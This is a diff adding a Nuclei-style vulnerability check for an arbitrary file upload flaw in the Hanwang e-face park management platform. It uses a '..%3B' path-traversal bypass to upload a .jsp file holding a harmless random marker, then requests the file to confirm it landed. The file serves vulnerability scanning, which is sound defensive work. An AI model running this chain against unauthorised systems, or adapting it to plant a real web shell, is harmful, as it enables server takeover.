@@ -1,0 +1,57 @@
+id: poc-yaml-hw-e-face-pass-spmp-upload-do-anyfile-upload
+info:
+  name: \u6C49\u738B\u0065\u8138\u901A\u667A\u60F3\u56ED\u533A\u7BA1\u7406\u5E73\u53F0 upload.do \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\u6F0F\u6D1E
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: \u6587\u4EF6\u4E0A\u4F20
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-check
+    method: POST
+    path:
+      - "/manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj"
+    body: |-
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.jsp"
+      Content-Type: image/jpeg
+
+      {{t2}}
+      ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"success\":true"
+        part: body
+    extractors:
+      - type: regex
+        name: file
+        group: 1
+        internal: true
+        regex:
+          - "operation/upload/(?P<file>.*?).jsp"
+
+  - id: file-access-check
+    method: GET
+    path:
+      - "/manage/operation/upload/{{file}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
